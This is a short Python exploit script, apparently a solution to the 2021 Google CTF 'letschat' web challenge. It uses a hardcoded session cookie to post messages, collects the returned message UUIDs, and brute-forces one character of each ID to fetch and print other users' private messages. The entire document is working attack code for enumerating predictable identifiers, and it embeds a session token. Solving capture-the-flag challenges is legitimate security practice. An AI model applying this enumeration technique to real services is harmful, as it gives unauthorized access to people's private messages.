import requests
import json
import time

def addMsg():
    requests.post(f"{TARGET}/message",data={"to":CHANNEL_NAME,"message":"AAA"},cookies=SESSION_COOKIES)
def getMsgsList():
    r = requests.post(f"{TARGET}/poll",data={"rooms":CHANNEL_NAME},cookies=SESSION_COOKIES)
    return json.loads(r.text)[CHANNEL_NAME]
SESSION_COOKIES = {"session":"MTYyNjUzNzQzMHxEdi1CQkFFQ180SUFBUkFCRUFBQVFQLUNBQUVHYzNSeWFXNW5EQVFBQW1sa0JuTjBjbWx1Wnd3bUFDUmhNbVl6TXprNFpTMWxOekUzTFRFeFpXSXRPVFJqTmkwNE1tSXhZbVl6TXpZMU9ETT18RahGU0WszAMdmQXPm3vvRf3j1uLgDcznRTRgsV4Vgbo="}
TARGET = "https://letschat-web.2021.ctfcompetition.com"
MSG_TARGET = "https://letschat-messages-web.2021.ctfcompetition.com/"
CHANNEL_NAME = "ffkjkjk123j123123ffff123"

for i in range(40):
    addMsg()
time.sleep(2)
msgs = getMsgsList()
print(msgs)
for msg in msgs:
    for j in "0123456789abcdef":
        fuuid = msg[0:7]+j+msg[8:]
        r = requests.get(f"{MSG_TARGET}/{fuuid}")
        if("Cthon98" in r.text or "AzureDiamond" in r.text):
            print(fuuid)
            print(r.text)